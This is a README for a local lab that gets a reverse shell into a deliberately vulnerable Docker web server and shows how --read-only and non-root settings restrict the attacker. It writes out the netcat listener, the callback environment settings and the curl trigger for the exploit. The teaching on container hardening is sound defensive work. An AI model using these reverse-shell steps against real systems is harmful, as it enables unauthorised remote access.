# README.md
Demonstrates getting access into a container

## TODO: 
1. Is it possible to escape the read-only and run tools in the package lists?  


## Find IP
```sh
#MacOS
LOCAL_IP=$(ifconfig en0 inet | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | head -n 1)  
echo ${LOCAL_IP}
```

## No Protection
### Shell 1
Run the stupid webserver.  Retrieve your host ip address and replace. 
```sh
docker build --target no_protection -t reverseshell . 
# Make sure that LOCAL_IP is set
docker run --env REMOTE_HOST=${LOCAL_IP} --env REMOTE_PORT=8888 --rm -p 8080:8080 reverseshell
```

### Shell 2
Run the callback service in a seperate shell 
```sh
nc -l -p 8888 -vvv 
```

### Shell 3
Invoke the exploit against the web server
```sh
curl localhost:8080
```

Now go back to shell 2 running the callback and list the contents. 
You will see a bash prompt that is connected to the container. 
```sh 
# Try and install something.
apt install curl

# Exiting will kill the container process
exit
```

## Readonly
### Shell 1
Run --read-only.   

```sh
docker build --target no_protection -t reverseshell . 
# Make sure that LOCAL_IP is set
docker run --read-only --env REMOTE_HOST=${LOCAL_IP} --env REMOTE_PORT=8888 --rm -p 8080:8080 reverseshell
```

### Shell 2
Run the callback service in a seperate shell 
```sh
nc -l -p 8888 -vvv 
```

### Shell 3
Invoke the exploit against the web server
```sh
curl localhost:8080
```

Now go back to shell 2 running the callback and list the contents. 
You will see a bash prompt that is connected to the container. 
```sh 
# Try and install something - but this time it FAILS.
apt install curl

# Exiting will kill the container process
exit
```

## Nonroot
### Shell 1
Build and run a non-root user image.   

```sh
docker build --target non_root -t reverseshell . 
# Make sure that LOCAL_IP is set
docker run --env REMOTE_HOST=${LOCAL_IP} --env REMOTE_PORT=8888 --rm -p 8080:8080 reverseshell
```

### Shell 2
Run the callback service in a seperate shell 
```sh
nc -l -p 8888 -vvv 
```

### Shell 3
Invoke the exploit against the web server
```sh
curl localhost:8080
```

Now go back to shell 2 running the callback and list the contents. 
You will see a bash prompt that is connected to the container. 
```sh 
# You're webuser now.
whoami
# Try and install something - but this time it FAILS.
apt install curl


# Exiting will kill the container process
exit
```

## Troubleshooting  
Test with a simple webservice  
```
docker run -it --rm -p 8080:8080 --entrypoint /bin/bash reverseshell
echo -e "HTTP/1.1 200 OK\n\n $(date)" | nc -l -p 8080 -q 1
curl localhost:8080
```

```
tmuxinator
tmuxinator stop reverseshell
```